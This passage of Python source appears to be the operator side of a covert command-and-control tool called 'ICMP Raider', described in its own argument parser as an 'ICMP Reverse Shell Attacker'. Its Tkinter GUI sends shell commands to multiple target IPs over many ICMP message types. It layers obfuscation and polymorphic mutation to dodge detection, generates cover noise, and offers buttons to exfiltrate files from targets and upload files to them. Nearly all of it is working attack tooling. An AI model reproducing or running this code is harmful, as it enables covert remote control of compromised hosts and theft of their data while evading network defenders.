    mutation_count = mutation_counts[target_ip]
    delay_mode = delay_modes[target_ip]
    delay_min = delay_mins[target_ip]
    delay_max = delay_maxs[target_ip]
    layers = layerss[target_ip]
    selected_ops = selected_opss[target_ip]

    output_text = scrolledtext.ScrolledText(tab, wrap=tk.WORD, width=80, height=20, bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
    output_text.pack(padx=10, pady=10)

    main_frame = tk.Frame(tab, bg='black')
    main_frame.pack(fill='both', expand=True)

    left_frame = tk.Frame(main_frame, bg='black')
    left_frame.pack(side='left', fill='y', padx=10)

    probe_button = tk.Button(left_frame, text="💜 Probe Alive", bg='#800080', fg='black', font=('Courier', 12, 'bold'))
    probe_button.pack(pady=5)

    def probe_alive():
        with seq_lock:
            probe_seq = seq_queue[target_ip]
            seq_queue[target_ip] = (seq_queue[target_ip] + 1) % 65536
        send_probe(target_ip, req_type, icmp_id, probe_seq, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed, mutation_count, layers, selected_ops)
        responsive = check_probe_response(target_ip, rep_type, icmp_id, probe_seq, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, poly_seed, mutation_count, layers, selected_ops, padding_seed)
        original_bg = probe_button['bg']
        if responsive:
            probe_button.config(bg='green')
        else:
            probe_button.config(bg='red')
        tab.after(2000, lambda: probe_button.config(bg=original_bg))

    probe_button.config(command=probe_alive)

    noise_label = tk.Label(left_frame, text="Noise Level:", bg='black', fg='#FF00FF', font=('Courier', 12, 'bold'))
    noise_label.pack(pady=5)

    noise_combo = ttk.Combobox(left_frame, values=["Low", "Medium", "High"], state="readonly")
    noise_combo.current(0)
    noise_combo.pack(pady=5)

    noise_stop_event = threading.Event()
    noise_thread = None

    def toggle_noise():
        nonlocal noise_thread
        if noise_button['text'] == "Generate Noise":
            level = noise_combo.get()
            noise_stop_event.clear()
            noise_thread = threading.Thread(target=send_noise, args=(target_ip, req_type, icmp_id, seq_queue, level, noise_stop_event, family, proto, local_ip, poly_seeds[target_ip], mutation_counts[target_ip]), daemon=True)
            noise_thread.start()
            noise_button.config(text="Stop Noise")
        else:
            noise_stop_event.set()
            if noise_thread:
                noise_thread.join()
            noise_button.config(text="Generate Noise")

    noise_button = tk.Button(left_frame, text="Generate Noise", command=toggle_noise, bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
    noise_button.pack(pady=5)

    center_frame = tk.Frame(main_frame, bg='black')
    center_frame.pack(side='left', fill='both', expand=True, padx=10)

    command_label = tk.Label(center_frame, text=f"Command for {target_ip}:", bg='black', fg='#FF00FF', font=('Courier', 12, 'bold'))
    command_label.pack(pady=5)

    command_frame = tk.Frame(center_frame, bg='black')
    command_frame.pack(pady=5)

    command_entry = tk.Entry(command_frame, width=60, bg='black', fg='#FF00FF', insertbackground='#FF00FF', font=('Courier', 10))
    command_entry.pack(side='left')

    context_menu = Menu(command_frame, tearoff=0)
    context_menu.add_command(label="Cut", command=lambda: command_entry.event_generate("<<Cut>>"))
    context_menu.add_command(label="Copy", command=lambda: command_entry.event_generate("<<Copy>>"))
    context_menu.add_command(label="Paste", command=lambda: command_entry.event_generate("<<Paste>>"))

    def show_context_menu(event):
        try:
            context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            context_menu.grab_release()

    command_entry.bind("<Button-3>", show_context_menu)

    def send_cmd():
        command = command_entry.get()
        if not command.strip():
            print("Empty command ignored")
            return
        def do_send():
            send_command(target_ip, command, req_type, icmp_id, seq_queue, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
        threading.Thread(target=do_send, daemon=True).start()
        command_entry.delete(0, tk.END)

    send_button = tk.Button(command_frame, text="Send Command", command=send_cmd, bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
    send_button.pack(side='left', padx=5)

    file_label = tk.Label(center_frame, text="Exfil File from Target:", bg='black', fg='#FF00FF', font=('Courier', 12, 'bold'))
    file_label.pack(pady=5)

    exfil_frame = tk.Frame(center_frame, bg='black')
    exfil_frame.pack(pady=5)

    file_entry = tk.Entry(exfil_frame, width=60, bg='black', fg='#FF00FF', insertbackground='#FF00FF', font=('Courier', 10))
    file_entry.pack(side='left')

    bottom_frame = tk.Frame(center_frame, bg='black')
    bottom_frame.pack(side='bottom', fill='x')

    exfil_cancel_event = threading.Event()
    exfil_cancel_button = tk.Button(bottom_frame, text="Cancel Exfil", command=lambda: exfil_cancel_event.set(), bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'), state=tk.DISABLED)
    exfil_cancel_button.pack(side='left', pady=5)

    def exfil_file():
        target_path = file_entry.get().strip()
        if not target_path:
            return
        exfil_cancel_event.clear()
        root.after(0, lambda: exfil_cancel_button.config(state=tk.NORMAL))
        def do_exfil():
            send_command(target_ip, f"exfil {target_path}", req_type, icmp_id, seq_queue, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=True, progress_callback=None, cancel_event=exfil_cancel_event, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
        threading.Thread(target=do_exfil, daemon=True).start()

    exfil_button = tk.Button(exfil_frame, text="Exfil File", command=exfil_file, bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
    exfil_button.pack(side='left', padx=5)

    exfil_status_label = tk.Label(center_frame, text="", bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
    exfil_status_label.pack(pady=5)

    upload_label = tk.Label(center_frame, text="Upload File to Target:", bg='black', fg='#FF00FF', font=('Courier', 12, 'bold'))
    upload_label.pack(pady=5)

    upload_path_frame = tk.Frame(center_frame, bg='black')
    upload_path_frame.pack(pady=5)

    target_path_entry = tk.Entry(upload_path_frame, width=60, bg='black', fg='#FF00FF', insertbackground='#FF00FF', font=('Courier', 10))
    target_path_entry.pack(side='left')
    target_path_entry.insert(0, "/path/on/target")

    upload_cancel_event = threading.Event()
    upload_cancel_button = tk.Button(bottom_frame, text="Cancel Upload", command=lambda: upload_cancel_event.set(), bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'), state=tk.DISABLED)
    upload_cancel_button.pack(side='left', pady=5, padx=5)

    def upload_file():
        local_path = filedialog.askopenfilename(title="Select File to Upload")
        if not local_path:
            return
        target_path = target_path_entry.get().strip()
        if not target_path:
            print("Target path required")
            return
        def do_upload():
            try:
                with open(local_path, 'rb') as f:
                    file_data = f.read()
                compressed_data = lzma.compress(file_data)
                encoded_data = base64.b64encode(compressed_data).decode('utf-8')
                filename = os.path.basename(local_path)
                command = f"upload {target_path} {filename}:{encoded_data}"
                upload_cancel_event.clear()
                root.after(0, lambda: upload_cancel_button.config(state=tk.NORMAL))
                result = send_command(target_ip, command, req_type, icmp_id, seq_queue, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=True, cancel_event=upload_cancel_event, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                if result == "Command canceled":
                    root.after(0, lambda: output_text.insert(tk.END, "Upload canceled\n\n"))
            except Exception as e:
                print(f"Upload error: {str(e)}")
            finally:
                root.after(0, lambda: upload_cancel_button.config(state=tk.DISABLED))

        threading.Thread(target=do_upload, daemon=True).start()

    upload_button = tk.Button(upload_path_frame, text="Upload File", command=upload_file, bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
    upload_button.pack(side='left', padx=5)

    upload_status_label = tk.Label(center_frame, text="", bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
    upload_status_label.pack(pady=5)

    threading.Thread(target=receive_output, args=(target_ip, rep_type, icmp_id, output_text, root, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, exfil_status_label, exfil_cancel_event, poly_seed, mutation_count, layers, selected_ops, padding_seed, req_type, seq_queue, cmd_prefix, delay_mode, delay_min, delay_max), daemon=True).start()

def create_broadcast_tab(notebook, target_ips, req_type, rep_type, icmp_id, seq_queue, family, proto, cmd_prefixes, padding_seeds, sub_tables, shifts, railfence_railss, bit_railss, poly_seeds, mutation_counts, delay_modes, delay_mins, delay_maxs, layerss, selected_opss):
    tab = tk.Frame(notebook, bg='black')
    notebook.add(tab, text="Broadcast All")

    main_frame = tk.Frame(tab, bg='black')
    main_frame.pack(fill='both', expand=True)

    center_frame = tk.Frame(main_frame, bg='black')
    center_frame.pack(side='left', fill='both', expand=True, padx=10)

    command_label = tk.Label(center_frame, text="Broadcast Command to All IPs:", bg='black', fg='#FF00FF', font=('Courier', 12, 'bold'))
    command_label.pack(pady=5)

    command_entry = tk.Entry(center_frame, width=70, bg='black', fg='#FF00FF', insertbackground='#FF00FF', font=('Courier', 10))
    command_entry.pack(pady=5)

    context_menu = Menu(center_frame, tearoff=0)
    context_menu.add_command(label="Cut", command=lambda: command_entry.event_generate("<<Cut>>"))
    context_menu.add_command(label="Copy", command=lambda: command_entry.event_generate("<<Copy>>"))
    context_menu.add_command(label="Paste", command=lambda: command_entry.event_generate("<<Paste>>"))

    def show_context_menu(event):
        try:
            context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            context_menu.grab_release()

    command_entry.bind("<Button-3>", show_context_menu)

    def send_broad():
        command = command_entry.get().strip()
        if not command:
            return
        def do_broad():
            for ip in target_ips:
                if ip in cmd_prefixes:
                    send_command(ip, command, req_type, icmp_id, seq_queue, cmd_prefixes[ip], padding_seeds[ip], sub_tables[ip], shifts[ip], railfence_railss[ip], bit_railss[ip], family, proto, poly_seed=poly_seeds[ip], mutation_count=mutation_counts[ip], delay_mode=delay_modes[ip], delay_min=delay_mins[ip], delay_max=delay_maxs[ip], layers=layerss[ip], selected_ops=selected_opss[ip])
        threading.Thread(target=do_broad, daemon=True).start()
        command_entry.delete(0, tk.END)

    send_button = tk.Button(center_frame, text="Send Broadcast", command=send_broad, bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
    send_button.pack(pady=5)

def main(target_ips, req_type, rep_type, icmp_id, family, proto):
    global is_echo
    is_echo = (req_type == 8 and rep_type == 0) or (req_type == 128 and rep_type == 129)
    local_ip = get_local_ip(target_ips[0], family)  
    root = tk.Tk()
    root.title("ICMP Raider")
    root.geometry("1000x700")
    root.configure(bg='black')
    root.option_add("*Font", "Courier 10 bold")

    ignore_file = None
    if is_echo:
        ignore_file = suppress_icmp(family)
        atexit.register(unsuppress_icmp, ignore_file)

    left_icon = tk.Label(root, text="↗💜", fg="purple", bg="black", font=("DejaVu Sans", 20, "bold"))
    left_icon.pack(side="left", padx=10)

    right_icon = tk.Label(root, text="☠", fg="purple", bg="black", font=("Courier", 32, "bold"))
    right_icon.pack(side="right", padx=10)

    seq_queue = {ip: random.randint(1, 65535) for ip in target_ips}

    cmd_prefixes = {}
    out_prefixes = {}
    padding_seeds = {}
    sub_tables = {}
    shifts = {}
    railfence_railss = {}
    bit_railss = {}
    poly_seeds = {}
    mutation_counts = {}
    delay_modes = {}
    delay_mins = {}
    delay_maxs = {}
    layerss = {}
    selected_opss = {}

    for ip in target_ips:
        seed = send_handshake(ip, req_type, icmp_id, seq_queue, family, proto)
        cmd_prefix, out_prefix, padding_seed, sub_table, shift_value, railfence_rails, bit_rails, poly_seed, mutation_count, delay_mode, delay_min, delay_max, layers, selected_ops = derive_prefixes(seed)
        cmd_prefixes[ip] = cmd_prefix
        out_prefixes[ip] = out_prefix
        padding_seeds[ip] = padding_seed
        sub_tables[ip] = sub_table
        shifts[ip] = shift_value
        railfence_railss[ip] = railfence_rails
        bit_railss[ip] = bit_rails
        poly_seeds[ip] = poly_seed
        mutation_counts[ip] = mutation_count
        delay_modes[ip] = delay_mode
        delay_mins[ip] = delay_min
        delay_maxs[ip] = delay_max
        layerss[ip] = layers
        selected_opss[ip] = selected_ops

    notebook = ttk.Notebook(root)
    notebook.pack(fill='both', expand=True, padx=10, pady=10)

    for ip in target_ips:
        create_tab(notebook, ip, req_type, rep_type, icmp_id, seq_queue, family, proto, local_ip, cmd_prefixes, out_prefixes, padding_seeds, sub_tables, shifts, railfence_railss, bit_railss, root, poly_seeds, mutation_counts, delay_modes, delay_mins, delay_maxs, layerss, selected_opss)

    create_broadcast_tab(notebook, target_ips, req_type, rep_type, icmp_id, seq_queue, family, proto, cmd_prefixes, padding_seeds, sub_tables, shifts, railfence_railss, bit_railss, poly_seeds, mutation_counts, delay_modes, delay_mins, delay_maxs, layerss, selected_opss)

    root.mainloop()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ICMP Reverse Shell Attacker")
    parser.add_argument("target_ips", nargs="+", help="IP addresses of the target devices")
    parser.add_argument("--id", type=lambda x: int(x, 0), default=ICMP_ID, help="Custom ICMP ID (hex or decimal, default 0x1337)")
    parser.add_argument("--ipv6", action="store_true", help="Use IPv6")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-E", action="store_true", help="Use Echo Request/Reply (types 8/0 or 128/129, default)")
    group.add_argument("-T", action="store_true", help="Use Timestamp Request/Reply (types 13/14, IPv4 only)")
    group.add_argument("-M", action="store_true", help="Use Address Mask Request/Reply (types 17/18, IPv4 only)")
    group.add_argument("-R", action="store_true", help="Use Information Request/Reply (types 15/16, IPv4 only)")
    group.add_argument("-S", action="store_true", help="Use Router Solicitation/Advertisement (types 10/9 or 133/134)")
    group.add_argument("-X", action="store_true", help="Use Experimental 1/2 (types 253/254)")
    group.add_argument("-N", action="store_true", help="Use Neighbor Sol/Adv (types 135/136, IPv6 only)")
    group.add_argument("-D", action="store_true", help="Use Domain Name Req/Rep (types 37/38, IPv4 only)")
    group.add_argument("-O", action="store_true", help="Use Mobile Reg Req/Rep (types 35/36, IPv4 only)")
    group.add_argument("-TR", action="store_true", help="Use Traceroute (types 30/0, IPv4 only, deprecated)")
    group.add_argument("-P", action="store_true", help="Use Photuris (types 40/40, IPv4 only)")
    group.add_argument("-EE", action="store_true", help="Use Extended Echo (types 42/43)")

    args = parser.parse_args()

    family = socket.AF_INET6 if args.ipv6 else socket.AF_INET
    proto = socket.IPPROTO_ICMPV6 if args.ipv6 else socket.IPPROTO_ICMP

    if args.ipv6:
        if args.E or not any([args.T, args.M, args.R, args.S, args.X, args.N, args.D, args.O, args.TR, args.P, args.EE]):
            req_type = 128
            rep_type = 129
        elif args.S:
            req_type = 133
            rep_type = 134
        elif args.X:
            req_type = 253
            rep_type = 254
        elif args.N:
            req_type = 135
            rep_type = 136
        elif args.EE:
            req_type = 42
            rep_type = 43
        else:
            print("Selected type not supported for IPv6")
            sys.exit(1)
    else:
        if args.E or not any([args.T, args.M, args.R, args.S, args.X, args.N, args.D, args.O, args.TR, args.P, args.EE]):
            req_type = 8
            rep_type = 0
        elif args.T:
            req_type = 13
            rep_type = 14
        elif args.M:
            req_type = 17
            rep_type = 18
        elif args.R:
            req_type = 15
            rep_type = 16
        elif args.S:
            req_type = 10
            rep_type = 9
        elif args.X:
            req_type = 253
            rep_type = 254
        elif args.D:
            req_type = 37
            rep_type = 38
        elif args.O:
            req_type = 35
            rep_type = 36
        elif args.TR:
            req_type = 30
            rep_type = 0
        elif args.P:
            req_type = 40
            rep_type = 40
        elif args.EE:
            req_type = 42
            rep_type = 43
        elif args.N:
            print("Neighbor Sol/Adv supported only for IPv6")
            sys.exit(1)

    main(args.target_ips, req_type, rep_type, args.id, family, proto)
